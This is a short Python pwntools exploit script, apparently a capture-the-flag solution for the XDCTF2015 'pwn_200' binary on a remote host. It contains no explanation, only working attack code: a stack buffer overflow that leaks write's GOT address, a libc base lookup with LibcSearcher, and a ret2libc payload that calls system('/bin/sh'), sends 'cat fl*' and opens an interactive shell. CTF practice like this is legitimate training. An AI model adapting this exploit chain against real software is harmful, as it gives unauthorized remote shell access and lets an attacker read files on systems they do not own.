from pwn import *
from LibcSearcher import *
h,p = '111.200.241.244',50870
p = remote(h,p)
#p = process("./pwn_200")
#gdb.attach("pwn_200")

#context.log_level='debug'
#libc = ELF("/lib32/libc-2.27.so")
elf = ELF("pwn_200")

write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x80483D0

#main = 0x804854B
print "main: ",hex(main)
print "write_plt: ",hex(write_plt)
print "write_got: ",hex(write_got)

exp = "A"*(0x6C+4)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)
p.sendlineafter("Welcome to XDCTF2015~!\n",exp)
write_addr = u32(p.recv(4))
print "write_addr", hex(write_addr)

#libc_base = write_addr - libc.sym['write']
libc = LibcSearcher("write",write_addr)
libc_base = write_addr - libc.dump('write')
print "libc_base:",hex(libc_base)

#system = libc_base + libc.sym['system']
#str_bin_sh = libc_base + libc.search("/bin/sh").next()
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
print "system:",hex(system)
print "str_bin_sh:",hex(str_bin_sh)
exp ="A"*(0x6c+4)+ p32(system)+"AAAA"+p32(str_bin_sh)
p.sendline(exp)
p.sendline("cat fl*")
p.interactive()
